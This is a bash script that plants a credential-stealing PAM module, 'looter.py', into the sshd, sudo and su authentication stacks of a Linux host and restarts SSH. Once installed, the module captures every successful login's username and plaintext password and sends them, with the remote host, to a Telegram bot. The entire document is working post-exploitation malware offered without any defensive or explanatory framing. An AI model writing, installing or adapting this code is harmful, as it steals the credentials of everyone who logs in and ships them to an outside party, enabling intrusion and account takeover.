#!/bin/bash

# Install dependencies to create a PAM module using python (Except for python-pip)
apt-get install python-pam libpam-python python-pip

# Install dependencies python
pip install requests

# Check if exist the entrie on pam, for this module
if ! grep -Fq "looter.py" /etc/pam.d/sshd;then
    sed -i "/common-auth/a auth requisite pam_python.so looter.py" /etc/pam.d/sshd
fi

if ! grep -Fq "looter.py" /etc/pam.d/sudo;then
    sed -i "/common-auth/a auth requisite pam_python.so looter.py" /etc/pam.d/sudo
fi

if ! grep -Fq "looter.py" /etc/pam.d/su;then
    sed -i "/common-auth/a auth requisite pam_python.so looter.py" /etc/pam.d/su
fi

code='
import spwd
import crypt
import requests

def sendMessage(msg):
    apiKey = "API-KEY"
    userId = "USER-ID"
    data = {"chat_id":userId,"text":msg}
    url = "https://api.telegram.org/bot{}/sendMessage".format(apiKey)
    r = requests.post(url,json=data)

def check_pw(user, password):
    """Check the password matches local unix password on file"""
    hashed_pw = spwd.getspnam(user)[1]
    return crypt.crypt(password, hashed_pw) == hashed_pw

def pam_sm_authenticate(pamh, flags, argv):
    try:
        user = pamh.get_user()
    except pamh.exception as e:
        return e.pam_result

    if not user:
        return pamh.PAM_USER_UNKNOWN
    try:
        resp = pamh.conversation(pamh.Message(pamh.PAM_PROMPT_ECHO_OFF, "Password:"))
    except pamh.exception as e:
        return e.pam_result

    if not check_pw(user, resp.resp):
        return pamh.PAM_AUTH_ERR

    sendMessage("Connection from host {} using the user {} and password {}".format(pamh.rhost, user, resp.resp))
    return pamh.PAM_SUCCESS


def pam_sm_setcred(pamh, flags, argv):
    return pamh.PAM_SUCCESS


def pam_sm_acct_mgmt(pamh, flags, argv):
    return pamh.PAM_SUCCESS


def pam_sm_open_session(pamh, flags, argv):
    return pamh.PAM_SUCCESS


def pam_sm_close_session(pamh, flags, argv):
    return pamh.PAM_SUCCESS


def pam_sm_chauthtok(pamh, flags, argv):
    return pamh.PAM_SUCCESS
'
mkdir -p /lib/security/
echo "$code" > /lib/security/looter.py
/etc/init.d/ssh restart
